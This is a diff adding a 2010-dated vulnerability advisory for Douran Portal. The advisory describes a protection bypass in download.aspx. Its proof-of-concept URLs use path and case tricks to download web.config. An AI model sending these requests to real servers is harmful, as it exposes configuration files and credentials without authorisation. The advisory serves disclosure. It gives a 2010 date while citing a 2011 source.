@@ -1,0 +1,29 @@
+# Title: [Douran Portal File Download/Source Code Disclosure Vulnerability]
+# Date of Publishing: [16 March 2010]
+# Application Name: [Douran Portal]
+# Version: [3.9.7.8]
+# Impact: [Medium]
+# Vendor: www.douran.com
+# Link: http://douran.com/HomePage.aspx?TabID=4862
+# Vendor Response(s): They didn't respond to the emails.
+# Credit to: AJAX Security Team
+# Finder(s):
+	- HUrr!c4nE! (bl4ck.k3yv4n [at] yahoo [dot] com) (ajaxtm.com)
+	- Soroush Dalili (Irsdl [at] yahoo [dot] com) (secproject.com)
+
+# Description:
+Regarding attack technique [1], it is possible to bypass the security protections of ?/download.aspx? in Douran Portal and download the hosted files.
+
+# PoC(s): 
+Try this first and see the access denied error: http://[HOST]/download.aspx?FilePathAttach=/&FileNameAttach=web.config&OriginalAttachFileName=secretfile.txt
+Now try these to bypass it:
+http://[HOST]/download.aspx?FilePathAttach=/&FileNameAttach=web.config\.&OriginalAttachFileName=secretfile.txt
+http://[HOST]/download.aspx?FilePathAttach=/&FileNameAttach=web.config%20&OriginalAttachFileName=secretfile.txt
+http://[HOST]/download.aspx?FilePathAttach=/&FileNameAttach=wEB.CoNfiG&OriginalAttachFileName=secretfile.txt
+
+# Reference:
+[1] Unrestricted File Download V1.0 ? Windows Server, (URL: http://soroush.secproject.com/blog/2011/01/unrestricted_file_download_v1_0/)
+
+# Important Notes:
+- Vendor did not respond to the email as well as the phone. As there is not any contact form or email address in the website, we have used all the emails which had been found by searching in Google such as support, info, and so on.
+
